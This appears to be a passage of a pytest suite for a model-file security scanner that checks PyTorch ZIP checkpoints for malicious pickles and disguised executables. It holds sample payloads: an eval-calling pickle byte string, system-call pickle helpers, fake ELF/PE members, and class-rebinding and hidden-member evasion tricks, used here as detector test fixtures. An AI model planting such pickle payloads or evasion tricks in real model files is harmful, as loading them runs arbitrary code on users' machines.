    model_path = tmp_path / "preimport_rebound_descriptor_training_args.bin"
    _write_training_args_bin(model_path, payload)
    marker = tmp_path / "preimport-rebound-descriptor-root.marker"
    site_packages = tmp_path / "trusted-site-packages"
    _write_rebindable_trusted_transformers_package(site_packages)

    script = (
        "import json, pickle, sys, zipfile\n"
        "from pathlib import Path\n"
        "import transformers.training_args as training_args\n"
        "model_path = Path(sys.argv[1])\n"
        "marker = Path(sys.argv[2])\n"
        "class DescriptorNew:\n"
        "    def __get__(self, instance, owner):\n"
        "        marker.write_text('descriptor-new', encoding='utf-8')\n"
        "        return lambda cls: object.__new__(cls)\n"
        "class ReboundTrainingArguments:\n"
        "    __new__ = DescriptorNew()\n"
        "ReboundTrainingArguments.__module__ = 'transformers.training_args'\n"
        "ReboundTrainingArguments.__qualname__ = 'TrainingArguments'\n"
        "training_args.TrainingArguments = ReboundTrainingArguments\n"
        "from modelaudit.scanners.pytorch_zip_scanner import PyTorchZipScanner\n"
        "result = PyTorchZipScanner().scan(str(model_path))\n"
        "marker_before_unpickle = marker.exists()\n"
        "with zipfile.ZipFile(model_path) as zip_file:\n"
        "    pickle.loads(zip_file.read('training_args/data.pkl'))\n"
        "print(json.dumps({\n"
        "    'success': result.success,\n"
        "    'pickle_verdict': result.metadata.get('pickle_verdict'),\n"
        "    'marker_before_unpickle': marker_before_unpickle,\n"
        "    'marker_after_unpickle': marker.exists(),\n"
        "    'issues': [\n"
        "        {\n"
        "            'rule_code': issue.rule_code,\n"
        "            'severity': issue.severity.value,\n"
        "            'import_reference': (issue.details or {}).get('import_reference'),\n"
        "        }\n"
        "        for issue in result.issues\n"
        "    ],\n"
        "}))\n"
    )

    completed = subprocess.run(
        [sys.executable, "-c", script, str(model_path), str(marker)],
        check=False,
        env=_preimport_rebound_subprocess_env(tmp_path, site_packages),
        capture_output=True,
        text=True,
    )

    assert completed.returncode == 0, completed.stderr
    output = json.loads(completed.stdout)
    assert output["marker_before_unpickle"] is False
    assert output["marker_after_unpickle"] is True
    assert output["pickle_verdict"] in {"suspicious", "malicious"}
    assert not (output["success"] is True and output["pickle_verdict"] == "clean" and not output["issues"])
    assert any(
        issue["rule_code"] == "NON_ALLOWLISTED_GLOBAL"
        and issue["import_reference"] == "transformers.training_args.TrainingArguments"
        for issue in output["issues"]
    )


@pytest.mark.integration
@pytest.mark.skipif(
    os.environ.get("MODELAUDIT_RUN_HF_REAL_MODEL_TESTS") != "1",
    reason="Set MODELAUDIT_RUN_HF_REAL_MODEL_TESTS=1 to download the pinned Hugging Face fixture.",
)
def test_real_huggingface_locateanything_training_args_metadata_clean(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setenv("PROMPTFOO_DISABLE_TELEMETRY", "1")
    monkeypatch.setenv("HF_HUB_DISABLE_TELEMETRY", "1")
    monkeypatch.setenv("MODELAUDIT_CACHE_DIR", str(tmp_path / "modelaudit-cache"))
    model_path = _download_pinned_training_args(tmp_path)

    result = scan_model_directory_or_file(str(model_path), cache_enabled=False)

    assert determine_exit_code(result) == 0
    assert result.files_scanned == 1
    assert not [issue for issue in result.issues if issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}]


@pytest.mark.integration
@pytest.mark.skipif(
    os.environ.get("MODELAUDIT_RUN_HF_REAL_MODEL_TESTS") != "1",
    reason="Set MODELAUDIT_RUN_HF_REAL_MODEL_TESTS=1 to download the pinned Hugging Face fixture.",
)
@pytest.mark.parametrize(
    ("repo_id", "revision", "filename", "sha256"),
    [
        (
            _HF_SUPRA_REPO_ID,
            _HF_SUPRA_REVISION,
            _HF_T10_FILENAME,
            _HF_SUPRA_TRAINING_ARGS_SHA256,
        ),
        (
            _HF_FAIRFACE_REPO_ID,
            _HF_FAIRFACE_REVISION,
            _HF_FAIRFACE_TRAINING_ARGS,
            _HF_FAIRFACE_TRAINING_ARGS_SHA256,
        ),
    ],
)
def test_real_huggingface_training_args_executable_metadata_refs_stay_suspicious(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    repo_id: str,
    revision: str,
    filename: str,
    sha256: str,
) -> None:
    monkeypatch.setenv("PROMPTFOO_DISABLE_TELEMETRY", "1")
    monkeypatch.setenv("HF_HUB_DISABLE_TELEMETRY", "1")
    model_path = _download_hf_file(
        tmp_path,
        repo_id=repo_id,
        revision=revision,
        filename=filename,
        sha256=sha256,
    )

    result = PyTorchZipScanner().scan(str(model_path))

    assert any(
        issue.rule_code == "S201"
        and issue.severity == IssueSeverity.WARNING
        and issue.details.get("pickle_filename") == "training_args/data.pkl"
        and issue.details.get("opcode_counts", {}).get("REDUCE", 0) > 0
        for issue in result.issues
    )
    assert any(
        issue.rule_code == "NON_ALLOWLISTED_GLOBAL"
        and issue.severity == IssueSeverity.WARNING
        and issue.details.get("invoked") is True
        and issue.details.get("pickle_filename") == "training_args/data.pkl"
        for issue in result.issues
    )
    assert not any(issue.severity == IssueSeverity.CRITICAL for issue in result.issues)


@pytest.mark.integration
@pytest.mark.skipif(
    os.environ.get("MODELAUDIT_RUN_HF_REAL_MODEL_TESTS") != "1",
    reason="Set MODELAUDIT_RUN_HF_REAL_MODEL_TESTS=1 to download the pinned Hugging Face fixture.",
)
def test_real_huggingface_fairface_rng_state_numpy_reconstruct_not_critical(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setenv("PROMPTFOO_DISABLE_TELEMETRY", "1")
    monkeypatch.setenv("HF_HUB_DISABLE_TELEMETRY", "1")
    model_path = _download_hf_file(
        tmp_path,
        repo_id=_HF_FAIRFACE_REPO_ID,
        revision=_HF_FAIRFACE_REVISION,
        filename=_HF_FAIRFACE_RNG_STATE,
        sha256=_HF_FAIRFACE_RNG_STATE_SHA256,
    )

    result = PyTorchZipScanner().scan(str(model_path))

    assert not any(
        issue.rule_code == "DANGEROUS_CALL_GRAPH"
        and issue.details.get("import_reference") == "numpy.core.multiarray._reconstruct"
        for issue in result.issues
    )
    assert not any(issue.severity == IssueSeverity.CRITICAL for issue in result.issues)


@pytest.mark.parametrize("suffix", [".ckpt", ".pkl", ".bin"])
def test_pytorch_zip_scanner_can_handle_requires_pytorch_zip_markers_for_ambiguous_suffixes(
    suffix: str,
    tmp_path: Path,
) -> None:
    """Generic ZIP files with ambiguous PyTorch suffixes should not route to PyTorchZipScanner."""
    model_path = tmp_path / f"generic{suffix}"
    with zipfile.ZipFile(model_path, "w") as archive:
        archive.writestr("payload.txt", "not a pytorch archive")

    assert PyTorchZipScanner.can_handle(str(model_path)) is False


def test_pytorch_zip_scanner_safe_model(tmp_path):
    """Test scanning a safe PyTorch ZIP model."""
    model_path = create_mock_pytorch_zip(tmp_path / "model.pt")

    scanner = PyTorchZipScanner()
    result = scanner.scan(str(model_path))

    assert result.success is True
    assert result.bytes_scanned > 0

    # Check for issues - a safe model might still have some informational issues
    error_issues = [issue for issue in result.issues if issue.severity == IssueSeverity.CRITICAL]
    assert len(error_issues) == 0


def test_pytorch_zip_scanner_malicious_model(tmp_path):
    """Test scanning a malicious PyTorch ZIP model."""
    model_path = create_mock_pytorch_zip(tmp_path / "model.pt", malicious=True)

    scanner = PyTorchZipScanner()
    result = scanner.scan(str(model_path))

    # The scanner should detect the eval function in the pickle
    assert any(issue.severity == IssueSeverity.CRITICAL for issue in result.issues)
    assert any("eval" in issue.message.lower() for issue in result.issues)


def test_pytorch_zip_discovery_rejects_ascii_opcode_plain_text_members(tmp_path: Path) -> None:
    """Plain text members that start with protocol-0 opcode bytes should not be routed as pickles."""
    model_path = tmp_path / "ascii_text_members.pt"
    with zipfile.ZipFile(model_path, "w") as zip_file:
        zip_file.writestr("archive/version", "3\n")
        zip_file.writestr("archive/byteorder", "little")
        zip_file.writestr("archive/data", b"cat is a category label, not a GLOBAL opcode stream")
        zip_file.writestr("archive/constants", b"I keep integer-looking notes in this checkpoint manifest")
        zip_file.writestr("archive/notes", b"(plain prose inside parentheses)")

    result = PyTorchZipScanner().scan(str(model_path))

    assert result.success is True
    assert result.metadata["pickle_files"] == []
    assert not any(
        check.name == "Pickle Format Check" and check.status == CheckStatus.FAILED for check in result.checks
    )
    assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)


def test_pytorch_zip_discovery_accepts_extensionless_proto0_pickle(tmp_path: Path) -> None:
    """Extensionless PyTorch pickle members should still be discovered through structural probing."""
    model_path = tmp_path / "extensionless_proto0.pt"
    with zipfile.ZipFile(model_path, "w") as zip_file:
        zip_file.writestr("archive/version", "3\n")
        zip_file.writestr("archive/byteorder", "little")
        zip_file.writestr("archive/data", pickle.dumps({"weights": [1, 2, 3]}, protocol=0))

    result = PyTorchZipScanner().scan(str(model_path))

    assert result.success is True
    assert result.metadata["pickle_files"] == ["archive/data"]
    assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)


def test_pytorch_zip_discovery_scans_only_real_extensionless_pickle_near_text(tmp_path: Path) -> None:
    """A real extensionless pickle should still be scanned when sibling text starts with pickle-ish bytes."""
    model_path = tmp_path / "mixed_extensionless_members.pt"
    with zipfile.ZipFile(model_path, "w") as zip_file:
        zip_file.writestr("archive/version", "3\n")
        zip_file.writestr("archive/byteorder", "little")
        zip_file.writestr("archive/data", b"cbuiltins\neval\n(S'print(1)'\ntR.")
        zip_file.writestr("archive/constants", b"compiled constants are documented here")

    result = PyTorchZipScanner().scan(str(model_path))

    assert result.metadata["pickle_files"] == ["archive/data"]
    assert any(issue.severity == IssueSeverity.CRITICAL and "eval" in issue.message.lower() for issue in result.issues)


def test_pytorch_zip_discovery_finds_hidden_extensionless_pickle_with_data_pkl(tmp_path: Path) -> None:
    """A normal data.pkl must not short-circuit hidden member pickle discovery."""
    model_path = tmp_path / "hidden_extensionless_pickle.pt"
    with zipfile.ZipFile(model_path, "w") as zip_file:
        zip_file.writestr("archive/version", "3\n")
        zip_file.writestr("archive/byteorder", "little")
        zip_file.writestr("archive/data.pkl", pickle.dumps({"weights": [1, 2, 3]}, protocol=4))
        zip_file.writestr("archive/payload", _malicious_proto0_system_payload())

    result = PyTorchZipScanner().scan(str(model_path))

    assert result.metadata["pickle_files"] == ["archive/data.pkl", "archive/payload"]
    assert any(
        issue.severity == IssueSeverity.CRITICAL and issue.details.get("pickle_filename") == "archive/payload"
        for issue in result.issues
    )


def test_pytorch_zip_discovery_finds_hidden_storage_pickle_with_data_pkl(tmp_path: Path) -> None:
    """Bounded storage-prefix sniffing should catch pickles hidden under data/<n>."""
    model_path = tmp_path / "hidden_storage_pickle.pt"
    with zipfile.ZipFile(model_path, "w") as zip_file:
        zip_file.writestr("archive/version", "3\n")
        zip_file.writestr("archive/byteorder", "little")
        zip_file.writestr("archive/data.pkl", pickle.dumps({"weights": [1, 2, 3]}, protocol=4))
        zip_file.writestr("archive/data/0", _malicious_proto0_system_payload())

    result = PyTorchZipScanner().scan(str(model_path))

    assert result.metadata["pickle_files"] == ["archive/data.pkl", "archive/data/0"]
    assert any(
        issue.severity == IssueSeverity.CRITICAL and issue.details.get("pickle_filename") == "archive/data/0"
        for issue in result.issues
    )


def test_pytorch_zip_discovery_ignores_benign_pickleish_text_with_data_pkl(tmp_path: Path) -> None:
    """Text that starts with protocol-0-looking bytes should not become a hidden pickle false positive."""
    model_path = tmp_path / "benign_pickleish_text.pt"
    with zipfile.ZipFile(model_path, "w") as zip_file:
        zip_file.writestr("archive/version", "3\n")
        zip_file.writestr("archive/byteorder", "little")
        zip_file.writestr("archive/data.pkl", pickle.dumps({"weights": [1, 2, 3]}, protocol=4))
        zip_file.writestr("archive/notes", b"cat is a category label, not a GLOBAL opcode stream")
        zip_file.writestr("archive/data/0", b"\x00" * 1024)

    result = PyTorchZipScanner().scan(str(model_path))

    assert result.success is True
    assert result.metadata["pickle_files"] == ["archive/data.pkl"]
    assert not any(
        issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
        and issue.details.get("pickle_filename") in {"archive/notes", "archive/data/0"}
        for issue in result.issues
    )


def test_pytorch_zip_discovery_aggregates_probe_failures_into_single_check(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """Multiple probe failures must collapse into one aggregated INFO check."""
    model_path = tmp_path / "unreadable_hidden_pickles.pt"
    with zipfile.ZipFile(model_path, "w") as zip_file:
        zip_file.writestr("archive/version", "3\n")
        zip_file.writestr("archive/byteorder", "little")
        zip_file.writestr("archive/data.pkl", pickle.dumps({"weights": [1, 2, 3]}, protocol=4))
        for index in range(5):
            zip_file.writestr(f"archive/blob{index}", b"\xff" * 128)

    original = PyTorchZipScanner._read_member_prefix

    def fail_probe(
        self: PyTorchZipScanner,
        zip_file: zipfile.ZipFile,
        entry: zipfile.ZipInfo,
        length: int,
        *,
        phase: str,
        result: ScanResult,
    ) -> bytes:
        name = self._get_zip_member_name(entry)
        if phase == "pickle_discovery" and "blob" in name:
            raise NotImplementedError(f"unsupported compression: {name}")
        return original(self, zip_file, entry, length, phase=phase, result=result)

    monkeypatch.setattr(PyTorchZipScanner, "_read_member_prefix", fail_probe)

    result = PyTorchZipScanner().scan(str(model_path))

    assert result.success is False
    assert result.metadata["analysis_incomplete"] is True
    assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
    reasons = result.metadata["scan_outcome_reasons"]
    assert reasons.count("pytorch_zip_pickle_discovery_incomplete") == 1

    probe_checks = [check for check in result.checks if check.name == "Pickle Discovery"]
    assert len(probe_checks) == 1
    details = probe_checks[0].details
    assert details["failed_count"] == 5
    assert sorted(details["zip_entries"]) == [f"archive/blob{index}" for index in range(5)]
    assert all(entry["exception_type"] == "NotImplementedError" for entry in details["entries"])


def test_pytorch_zip_scanner_detects_case_insensitive_native_library_members(tmp_path: Path) -> None:
    model_path = create_mock_pytorch_zip(tmp_path / "native_libs.pt")
    with zipfile.ZipFile(model_path, "a") as zip_file:
        zip_file.writestr("archive/data/MALICIOUS.SO", b"\x7fELF")
        zip_file.writestr("archive/data/libpayload.SO.6", b"\x7fELF")
        zip_file.writestr("archive/data/plugin.Dylib", b"\xfe\xed\xfa\xcf")

    result = PyTorchZipScanner().scan(str(model_path))

    executable_issues = [
        issue for issue in result.issues if issue.message and "Executable file found in PyTorch model" in issue.message
    ]
    executable_files = {issue.details.get("file") for issue in executable_issues}
    assert {
        "archive/data/MALICIOUS.SO",
        "archive/data/libpayload.SO.6",
        "archive/data/plugin.Dylib",
    }.issubset(executable_files)
    assert all(issue.severity == IssueSeverity.CRITICAL for issue in executable_issues)


def test_pytorch_zip_scanner_native_library_near_match_extension_stays_clean(tmp_path: Path) -> None:
    model_path = create_mock_pytorch_zip(tmp_path / "near_match.pt")
    with zipfile.ZipFile(model_path, "a") as zip_file:
        zip_file.writestr("archive/data/plugin.sology", b"not a shared object")
        zip_file.writestr("archive/data/plugin.so.version", b"not a versioned shared object")
        zip_file.writestr("archive/data/plugin.so.6cache", b"not a versioned shared object")
        zip_file.writestr("archive/data/plugin.dllcache", b"not a dll")

    result = PyTorchZipScanner().scan(str(model_path))

    assert not any(
        issue.message and "Executable file found in PyTorch model" in issue.message for issue in result.issues
    )


def test_pytorch_zip_scanner_detects_disguised_executable_sidecar_by_content(tmp_path: Path) -> None:
    """Strong executable bytes must not disappear behind an ordinary sidecar suffix."""
    model_path = create_mock_pytorch_zip(tmp_path / "disguised_executable.pt", prefix="archive")
    distant_pe_header = bytearray(b"\x00" * 2052)
    distant_pe_header[:2] = b"MZ"
    distant_pe_header[0x3C:0x40] = (2048).to_bytes(4, "little")
    distant_pe_header[2048:2052] = b"PE\x00\x00"
    with zipfile.ZipFile(model_path, "a") as zip_file:
        zip_file.writestr("archive/weights/payload.bin", b"\x7fELF\x02\x01\x01\x00" + (b"\x00" * 64))
        zip_file.writestr("archive/weights/loader.dat", bytes(distant_pe_header))

    direct_result = PyTorchZipScanner().scan(str(model_path))
    assert direct_result.success is False
    executable_checks = {
        check.details.get("file"): check
        for check in direct_result.checks
        if check.name == "Executable File Detection" and check.status == CheckStatus.FAILED
    }
    assert {"archive/weights/payload.bin", "archive/weights/loader.dat"}.issubset(executable_checks)
    assert executable_checks["archive/weights/payload.bin"].rule_code == "S502"
    assert executable_checks["archive/weights/loader.dat"].rule_code == "S501"
    assert all(check.severity == IssueSeverity.CRITICAL for check in executable_checks.values())

    aggregate_result = scan_model_directory_or_file(str(model_path), cache_scan_results=False)
    assert determine_exit_code(aggregate_result) == 1
    finding_messages = {issue.message for issue in aggregate_result.issues}
    assert "Executable file found in PyTorch model: archive/weights/payload.bin" in finding_messages
    assert "Executable file found in PyTorch model: archive/weights/loader.dat" in finding_messages


def test_pytorch_zip_scanner_detects_executable_bytes_hidden_behind_python_name(tmp_path: Path) -> None:
    """A Python suffix must not reduce a native payload to a warning-only finding."""
    model_path = create_mock_pytorch_zip(tmp_path / "python_named_executable.pt", prefix="archive")
    with zipfile.ZipFile(model_path, "a") as zip_file:
        zip_file.writestr("archive/code/payload.py", b"\x7fELF\x02\x01\x01\x00" + (b"\x00" * 64))

    result = PyTorchZipScanner().scan(str(model_path))

    assert result.success is False
    assert any(
        check.name == "Executable File Detection"
        and check.status == CheckStatus.FAILED
        and check.severity == IssueSeverity.CRITICAL
        and check.details.get("file") == "archive/code/payload.py"
        for check in result.checks
    )


def test_pytorch_zip_scanner_detects_executable_sidecar_under_untrusted_data_path(tmp_path: Path) -> None:
    """Only validated tensor storage blobs should skip executable-content probing."""
    model_path = create_mock_pytorch_zip(tmp_path / "untrusted_data_path.pt", prefix="archive")
    with zipfile.ZipFile(model_path, "a") as zip_file:
        zip_file.writestr("archive/weights/data/0", b"\x7fELF\x02\x01\x01\x00" + (b"\x00" * 64))

    result = PyTorchZipScanner().scan(str(model_path))

    assert any(
        check.name == "Executable File Detection"
        and check.status == CheckStatus.FAILED
        and check.severity == IssueSeverity.CRITICAL
        and check.details.get("file") == "archive/weights/data/0"
        for check in result.checks
    )


def test_pytorch_zip_scanner_marks_over_budget_pe_header_offset_inconclusive(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """An unconfirmed PE pointer must not become a fabricated executable finding."""
    model_path = create_mock_pytorch_zip(tmp_path / "oversized_pe_offset.pt", prefix="archive")
    sidecar = bytearray(b"\x00" * 64)
    sidecar[:2] = b"MZ"
    sidecar[0x3C:0x40] = ((1024 * 1024) + 1).to_bytes(4, "little")
    with zipfile.ZipFile(model_path, "a") as zip_file:
        zip_file.writestr("archive/weights/loader.dat", bytes(sidecar))

    original = PyTorchZipScanner._read_member_prefix
    content_probe_limits: list[int] = []

    def record_content_probe(
        self: PyTorchZipScanner,
        zip_file: zipfile.ZipFile,
        entry: zipfile.ZipInfo,
        limit: int,
        *,
        phase: str,
        result: ScanResult,
    ) -> bytes:
        if phase == "executable member content probe" and entry.filename.endswith("loader.dat"):
            content_probe_limits.append(limit)
        return original(self, zip_file, entry, limit, phase=phase, result=result)

    monkeypatch.setattr(PyTorchZipScanner, "_read_member_prefix", record_content_probe)

    result = PyTorchZipScanner().scan(str(model_path))

    assert content_probe_limits == [1024]
    assert result.success is False
    assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
    assert "pytorch_zip_executable_member_probe_failed" in result.metadata["scan_outcome_reasons"]
    assert not any(
        check.name == "Executable File Detection"
        and check.status == CheckStatus.FAILED
        and check.details.get("file") == "archive/weights/loader.dat"
        for check in result.checks
    )
    probe_checks = [check for check in result.checks if check.name == "Executable Content Probe"]
    assert len(probe_checks) == 1
    assert probe_checks[0].details["entries"][0]["exception_type"] == "BoundedProbeIncomplete"


def test_pytorch_zip_scanner_does_not_treat_tensor_storage_bytes_as_executable_sidecar(tmp_path: Path) -> None:
    """Arbitrary tensor storage bytes are not evidence of an executable archive member."""
    model_path = create_mock_pytorch_zip(tmp_path / "tensor_bytes.pt", with_pickle=False, prefix="archive")
    with zipfile.ZipFile(model_path, "a") as zip_file:
        zip_file.writestr("archive/data.pkl", _pytorch_storage_persistent_id_payload("0"))
        zip_file.writestr("archive/data/0", b"\x7fELF\x02\x01\x01\x00" + (b"\x00" * 64))

    result = PyTorchZipScanner().scan(str(model_path))

    assert any(check.details.get("trusted_pytorch_archive_context") is True for check in result.checks)
    assert not any(
        check.name == "Executable File Detection"
        and check.status == CheckStatus.FAILED
        and check.details.get("file") == "archive/data/0"
        for check in result.checks
    )


def test_pytorch_zip_scanner_keeps_tensor_storage_trust_when_pickle_scanner_is_disabled(tmp_path: Path) -> None:
    """Scanner-only PyTorch ZIP scans still need trusted storage IDs to avoid tensor-byte false positives."""
    model_path = create_mock_pytorch_zip(tmp_path / "scanner_only_tensor_bytes.pt", with_pickle=False, prefix="archive")
    with zipfile.ZipFile(model_path, "a") as zip_file:
        zip_file.writestr("archive/data.pkl", _pytorch_storage_persistent_id_payload("0"))
        zip_file.writestr("archive/data/0", b"\x7fELF\x02\x01\x01\x00" + (b"\x00" * 64))

    result = PyTorchZipScanner(config={"scanners": ["pytorch_zip"]}).scan(str(model_path))

    assert result.success is True
    assert any(
        check.name == "Scanner Selection" and check.details.get("skipped_scanner_id") == "pickle"
        for check in result.checks
    )
    assert any(check.details.get("trusted_pytorch_archive_context") is True for check in result.checks)
    assert not any(
        check.name == "Executable File Detection"
        and check.status == CheckStatus.FAILED
        and check.details.get("file") == "archive/data/0"
        for check in result.checks
    )


def test_pytorch_zip_scanner_probes_unreferenced_numeric_storage_lookalike(tmp_path: Path) -> None:
    """An unreferenced canonical-looking data member remains an executable sidecar."""
    model_path = create_mock_pytorch_zip(tmp_path / "unreferenced_tensor_bytes.pt", with_pickle=False, prefix="archive")
    with zipfile.ZipFile(model_path, "a") as zip_file:
        zip_file.writestr("archive/data.pkl", _pytorch_storage_persistent_id_payload("0"))
        zip_file.writestr("archive/data/0", b"\x00" * 8)
        zip_file.writestr("archive/data/999", b"\x7fELF\x02\x01\x01\x00" + (b"\x00" * 64))

    result = PyTorchZipScanner().scan(str(model_path))

    assert any(
        check.name == "Executable File Detection"
        and check.status == CheckStatus.FAILED
        and check.severity == IssueSeverity.CRITICAL
        and check.details.get("file") == "archive/data/999"
        for check in result.checks
    )


def test_pytorch_zip_scanner_only_probes_popped_storage_key_decoys(tmp_path: Path) -> None:
    """Scanner-only fallback trust must follow the actual BINPERSID operand."""
    model_path = create_mock_pytorch_zip(tmp_path / "popped_storage_decoy.pt", with_pickle=False, prefix="archive")
    with zipfile.ZipFile(model_path, "a") as zip_file:
        zip_file.writestr("archive/data.pkl", _pytorch_storage_persistent_id_payload_with_popped_key("0", "999"))
        zip_file.writestr("archive/data/0", b"\x00" * 8)
        zip_file.writestr("archive/data/999", b"\x7fELF\x02\x01\x01\x00" + (b"\x00" * 64))

    result = PyTorchZipScanner(config={"scanners": ["pytorch_zip"]}).scan(str(model_path))

    assert result.success is False
    trusted_keys = {
        check.details.get("pytorch_storage_key")
        for check in result.checks
        if check.details.get("trusted_pytorch_archive_context") is True
    }
    assert trusted_keys == {"0"}
    assert any(
        check.name == "Executable File Detection"
        and check.status == CheckStatus.FAILED
        and check.severity == IssueSeverity.CRITICAL
        and check.details.get("file") == "archive/data/999"
        for check in result.checks
    )


def test_pytorch_zip_scanner_only_rejects_fake_byte_storage_descriptors(tmp_path: Path) -> None:
    """Scanner-only fallback trust must require a real torch storage GLOBAL descriptor."""
    model_path = create_mock_pytorch_zip(tmp_path / "fake_byte_storage.pt", with_pickle=False, prefix="archive")
    with zipfile.ZipFile(model_path, "a") as zip_file:
        zip_file.writestr("archive/data.pkl", _fake_byte_storage_persistent_id_payload("999"))
        zip_file.writestr("archive/data/999", b"\x7fELF\x02\x01\x01\x00" + (b"\x00" * 64))

    result = PyTorchZipScanner(config={"scanners": ["pytorch_zip"]}).scan(str(model_path))

    assert result.success is False
    assert not any(
        check.details.get("trusted_pytorch_archive_context") is True
        and check.details.get("pytorch_storage_key") == "999"
        for check in result.checks
    )
    assert any(
        check.name == "Executable File Detection"
        and check.status == CheckStatus.FAILED
        and check.severity == IssueSeverity.CRITICAL
        and check.details.get("file") == "archive/data/999"
        for check in result.checks
    )


def test_pytorch_zip_scanner_fails_closed_when_executable_content_probe_cannot_read(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """Unreadable ordinary sidecars leave executable-content coverage incomplete."""
    model_path = create_mock_pytorch_zip(tmp_path / "unreadable_sidecar.pt", prefix="archive")
    with zipfile.ZipFile(model_path, "a") as zip_file:
        zip_file.writestr("archive/weights/sidecar.bin", b"ordinary metadata")

    original = PyTorchZipScanner._read_member_prefix

    def fail_content_probe(
        self: PyTorchZipScanner,
        zip_file: zipfile.ZipFile,
        entry: zipfile.ZipInfo,
        limit: int,
        *,
        phase: str,
        result: ScanResult,
    ) -> bytes:
        if phase == "executable member content probe" and entry.filename.endswith("sidecar.bin"):
            raise OSError("simulated executable probe read failure")
        return original(self, zip_file, entry, limit, phase=phase, result=result)

    monkeypatch.setattr(PyTorchZipScanner, "_read_member_prefix", fail_content_probe)

    result = PyTorchZipScanner().scan(str(model_path))

    assert result.success is False
    assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
    assert "pytorch_zip_executable_member_probe_failed" in result.metadata["scan_outcome_reasons"]
    probe_checks = [check for check in result.checks if check.name == "Executable Content Probe"]
    assert len(probe_checks) == 1
    assert probe_checks[0].severity == IssueSeverity.INFO
    assert probe_checks[0].details["entries"][0]["zip_entry"] == "archive/weights/sidecar.bin"
    assert not [
        check
        for check in result.checks
        if check.name == "Executable File Detection" and check.status == CheckStatus.PASSED
    ]
    _assert_pytorch_zip_inconclusive_not_cached(
        model_path,
        tmp_path / "cache",
        "pytorch_zip_executable_member_probe_failed",
        expected_success=False,
        expected_exit_code=2,
    )


def test_pytorch_zip_scanner_relaxes_crc_for_pickle_scan(tmp_path: Path) -> None:
    """CRC-mismatched pickle entries should still be scanned with an explicit warning."""
    model_path = create_mock_pytorch_zip(tmp_path / "crc_mismatch.pt", malicious=True)
    _corrupt_zip_member_crc(model_path, "data.pkl")

    result = PyTorchZipScanner().scan(str(model_path))

    crc_checks = [check for check in result.checks if check.name == "PyTorch ZIP CRC Handling"]

    assert result.success is False
    assert any(issue.severity == IssueSeverity.CRITICAL and "eval" in issue.message.lower() for issue in result.issues)
    assert len(crc_checks) == 1
    assert crc_checks[0].status == CheckStatus.FAILED
    assert crc_checks[0].severity == IssueSeverity.WARNING
    assert crc_checks[0].details["zip_entry"] == "data.pkl"
    assert crc_checks[0].details["scan_phases"] == result.metadata["relaxed_crc_members"]["data.pkl"]
    assert "pickle_scan" in crc_checks[0].details["scan_phases"]
    assert "pickle_scan" in result.metadata["relaxed_crc_members"]["data.pkl"]


def test_pytorch_zip_scanner_normal_archive_skips_relaxed_crc_signal(tmp_path: Path) -> None:
    """Valid archives should stay on the strict member-read path."""
    model_path = create_mock_pytorch_zip(tmp_path / "model.pt")

    result = PyTorchZipScanner().scan(str(model_path))

    assert result.success is True
    assert "relaxed_crc_members" not in result.metadata
    assert not [check for check in result.checks if check.name == "PyTorch ZIP CRC Handling"]


def test_pytorch_zip_scanner_scans_shadowed_duplicate_data_pkl(tmp_path: Path) -> None:
    """A benign last-write duplicate must not hide a malicious earlier data.pkl entry."""
    model_path = tmp_path / "duplicate_data_pkl.pt"
    safe_payload = pickle.dumps({"weights": [1, 2, 3]})
    _write_zip_with_duplicate_data_pkl(model_path, _malicious_eval_pickle_payload(), safe_payload)

    scanner = PyTorchZipScanner()
    result = scanner.scan(str(model_path))

    duplicate_collision_checks = [check for check in result.checks if check.name == "Duplicate ZIP Entry Collision"]
    critical_issues = [issue for issue in result.issues if issue.severity == IssueSeverity.CRITICAL]

    assert any("eval" in issue.message.lower() for issue in critical_issues)
    assert any(check.status == CheckStatus.FAILED for check in duplicate_collision_checks)
    assert result.metadata["pickle_files"] == ["data.pkl", "data.pkl"]


def test_pytorch_zip_scanner_allows_identical_duplicate_data_pkl(tmp_path: Path) -> None:
    """Identical duplicate data.pkl entries should both be scanned without collision noise."""
    model_path = tmp_path / "identical_duplicate_data_pkl.pt"
    safe_payload = pickle.dumps({"weights": [1, 2, 3]})
    _write_zip_with_duplicate_data_pkl(model_path, safe_payload, safe_payload)

    scanner = PyTorchZipScanner()
    result = scanner.scan(str(model_path))

    duplicate_collision_checks = [check for check in result.checks if check.name == "Duplicate ZIP Entry Collision"]

    assert result.success is True
    assert not [issue for issue in result.issues if issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}]
    assert len(duplicate_collision_checks) == 1
    assert duplicate_collision_checks[0].status == CheckStatus.PASSED
    assert result.metadata["pickle_files"] == ["data.pkl", "data.pkl"]


def test_pytorch_zip_scanner_conflicting_duplicate_data_pkl_is_info_only(tmp_path: Path) -> None:
    """Conflicting duplicate data.pkl entries should stay non-failing when every copy is benign."""
    model_path = tmp_path / "conflicting_duplicate_data_pkl.pt"
    first_payload = pickle.dumps({"weights": [1, 2, 3]})
    second_payload = pickle.dumps({"weights": [4, 5, 6]})
    _write_zip_with_duplicate_data_pkl(model_path, first_payload, second_payload)

    scanner = PyTorchZipScanner()
    result = scanner.scan(str(model_path))

    duplicate_collision_checks = [check for check in result.checks if check.name == "Duplicate ZIP Entry Collision"]

    assert result.success is True
    assert not [issue for issue in result.issues if issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}]
    assert len(duplicate_collision_checks) == 1
    assert duplicate_collision_checks[0].status == CheckStatus.FAILED
    assert duplicate_collision_checks[0].severity == IssueSeverity.INFO
    assert result.metadata["pickle_files"] == ["data.pkl", "data.pkl"]


